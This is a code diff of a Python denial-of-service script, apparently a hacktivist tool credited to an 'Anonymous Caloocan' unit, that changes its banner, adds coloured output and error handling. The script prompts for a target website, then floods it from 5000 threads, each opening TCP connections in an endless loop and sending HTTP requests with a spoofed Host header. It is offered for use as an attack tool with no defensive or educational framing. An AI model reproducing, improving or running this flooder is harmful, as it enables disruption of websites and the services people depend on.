@@ -4,29 +4,35 @@ import time
 import urllib.request
 from urllib.error import HTTPError
 
-print("""
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
 
-    ___                      ______      __    
-   /   |  ____  ____  ____  / ________ _/ /    
-  / /| | / __ \/ __ \/ __ \/ /   / __ `/ /     
- / ___ |/ / / / /_/ / / / / /___/ /_/ / /      
-/_/  |_/_/ /_/\____/_/ /_/\____/\__,_/_/                                                      
-       __    __              __              __
-  ____/ ____/ ____  _____   / /_____  ____  / /
- / __  / __  / __ \/ ___/  / __/ __ \/ __ \/ / 
-/ /_/ / /_/ / /_/ (__  )  / /_/ /_/ / /_/ / /  
-\__,_/\__,_/\____/____/   \__/\____/\____/_/   
+print(f"""{bcolors.HEADER}
+
+ ______  __    __  ______  __  __  ______  ______  ______  __  __  ______  
+/\  ___\/\ "-./  \/\  __ \/\ \/ / /\  ___\/\  ___\/\  __ \/\ \/\ \/\__  _\ 
+\ \___  \ \ \-./\ \ \ \/\ \ \  _"-\ \  __\\ \___  \ \ \/\ \ \ \_\ \/_/\ \/ 
+ \/\_____\ \_\ \ \_\ \_____\ \_\ \_\ \_____\/\_____\ \_____\ \_____\ \ \_\ 
+  \/_____/\/_/  \/_/\/_____/\/_/\/_/\/_____/\/_____/\/_____/\/_____/  \/_/                                                                     
+ {bcolors.ENDC}""") #logo
+print("""   Developed by bloos3rpent of Anonymous Caloocan Ground and Cyber Unit
+
 """)
-print("""          Lightweight v1
 
-""")
-
+already_connected = 0
 def main():
-    print("""
+    print(f"""{bcolors.OKGREEN}
     [1] Attack Website
     [2] Check Website Status
     [3] Exit
-    """)
+    {bcolors.ENDC}""")
 
     def ddos():
         target = input('target: ')
@@ -35,22 +41,25 @@ def main():
         fake_ip = '182.21.20.32'
 
         time.sleep(3)
-        print("attack started")
+        print(f"{bcolors.OKBLUE}Attack started{bcolors.ENDC}")
+        time.sleep(1)
         already_connected = 0
 
         def attack():
             while 1 > 0:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((target, port))
-                s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),(target, port))
-                s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((target, port))
+                    s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),(target, port))
+                    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
 
-                global already_connected
-                already_connected += 1
-                packetssent = str(already_connected)
+                    global already_connected
+                    already_connected += 1
+                    packetssent = str(already_connected)
 
-                print("packets sent: " + packetssent)
-
+                    print(f"{bcolors.OKGREEN}packets sent: {bcolors.ENDC}" + packetssent)
+                except:
+                    print(f"{bcolors.FAIL}Connection Timeout server might be already down or check your internet connection{bcolors.ENDC}")
 
         for i in range(5000):
             thread = threading.Thread(target=attack)
